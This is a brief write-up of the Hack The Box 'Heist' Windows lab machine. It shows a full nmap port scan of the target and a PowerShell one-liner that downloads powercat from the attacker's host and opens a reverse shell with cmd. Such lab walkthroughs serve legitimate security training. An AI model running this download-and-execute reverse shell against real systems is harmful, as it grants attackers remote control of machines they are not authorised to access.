Heist - Windows machine from HTB

Initial port scanning against the target:

root@kali:~# nmap -v -p 1-65535 -sV -O -sS -T4 10.10.10.149


powershell to download the script and execute it to get reverse shell:

powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.101/powercat/powercat.ps1');powercat -c 10.10.14.101 -p 9091 -e cmd"
